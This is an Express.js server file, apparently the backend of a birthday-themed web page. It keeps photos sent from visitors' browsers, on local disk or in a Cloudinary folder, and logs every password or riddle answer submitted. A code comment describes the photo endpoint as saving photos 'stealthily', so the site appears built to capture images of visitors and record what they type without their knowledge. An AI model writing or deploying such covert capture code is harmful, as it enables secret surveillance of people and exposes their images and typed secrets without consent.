const express = require('express');
const path = require('path');
const fs = require('fs');
const cloudinary = require('cloudinary').v2;
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Cloudinary Configuration (Optional - only needed for production/Render)
const isCloudinaryConfigured = process.env.CLOUDINARY_CLOUD_NAME && 
                              process.env.CLOUDINARY_API_KEY && 
                              process.env.CLOUDINARY_API_SECRET;

if (isCloudinaryConfigured) {
    cloudinary.config({
        cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
        api_key: process.env.CLOUDINARY_API_KEY,
        api_secret: process.env.CLOUDINARY_API_SECRET
    });
    console.log("☁️  Cloudinary storage enabled!");
} else {
    console.log("📁 Local storage enabled (Photos will be lost on Render restart).");
}

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/captures', express.static(path.join(__dirname, 'captures')));

const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) {
    fs.mkdirSync(capturesDir, { recursive: true });
}

// Memory cache for captures in case of disk wipe (last resort for session)
let cloudCaptures = [];

// Endpoint to list all captured photos
app.get('/api/captures', async (req, res) => {
    try {
        if (isCloudinaryConfigured) {
            // Fetch from Cloudinary
            const result = await cloudinary.api.resources({
                type: 'upload',
                prefix: 'birthday_captures/',
                max_results: 100
            });
            const files = result.resources.map(r => r.secure_url).reverse();
            return res.json({ success: true, files, isCloud: true });
        } else {
            // Standard local disk read
            if (!fs.existsSync(capturesDir)) return res.json({ success: true, files: [] });
            const files = fs.readdirSync(capturesDir).filter(f => f.endsWith('.png') || f.endsWith('.jpg'));
            files.sort((a, b) => {
                try {
                    return fs.statSync(path.join(capturesDir, b)).mtime.getTime() - 
                           fs.statSync(path.join(capturesDir, a)).mtime.getTime();
                } catch(e) { return 0; }
            });
            res.json({ success: true, files, isCloud: false });
        }
    } catch(err) {
        console.error("Error listing captures:", err);
        res.status(500).json({ success: false, files: [] });
    }
});

// Endpoint to stealthily save photos
app.post('/api/save-photo', async (req, res) => {
    try {
        const { imageBase64 } = req.body;
        if (!imageBase64) return res.status(400).send('No image provided');
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `photo_${timestamp}`;

        if (isCloudinaryConfigured) {
            // Upload to Cloudinary
            await cloudinary.uploader.upload(imageBase64, {
                folder: 'birthday_captures',
                public_id: filename,
                resource_type: 'image'
            });
            console.log(`☁️  Photo saved to Cloudinary: ${filename}`);
        } else {
            // Save to local disk
            const base64Data = imageBase64.replace(/^data:image\/png;base64,/, "");
            const filepath = path.join(capturesDir, `${filename}.png`);
            fs.writeFileSync(filepath, base64Data, 'base64');
            console.log(`📸 Photo saved locally: captures/${filename}.png`);
        }
        
        res.status(200).send({ success: true });
    } catch(err) {
        console.error("Error saving photo:", err);
        res.status(500).send({ success: false });
    }
});

// --- Attempts Persistence ---
const attemptsFile = path.join(__dirname, 'attempts.json');
let lastAttempts = []; // Memory fallback

app.get('/api/attempts', (req, res) => {
    try {
        let attempts = [...lastAttempts];
        if (fs.existsSync(attemptsFile)) {
            const data = fs.readFileSync(attemptsFile, 'utf8');
            attempts = JSON.parse(data || '[]');
        }
        res.json({ success: true, attempts });
    } catch (err) {
        res.status(500).json({ success: false, attempts: [] });
    }
});

app.post('/api/log-attempt', (req, res) => {
    try {
        const { password, timestamp, type = 'riddle' } = req.body;
        let attempts = [];
        if (fs.existsSync(attemptsFile)) {
            const data = fs.readFileSync(attemptsFile, 'utf8');
            attempts = JSON.parse(data || '[]');
        }
        attempts.unshift({ password, timestamp, type });
        if (attempts.length > 100) attempts = attempts.slice(0, 100);
        
        lastAttempts = attempts; // Save to memory in case disk is wiped
        
        try {
            fs.writeFileSync(attemptsFile, JSON.stringify(attempts, null, 2));
        } catch(e) { console.error("Disk write failed, keeping in memory only."); }
        
        console.log(`🔑 New attempt [${type}]: "${password}"`);
        res.status(200).send({ success: true });
    } catch (err) {
        res.status(500).send({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(`\n🎉 Server running on port ${PORT}`);
});

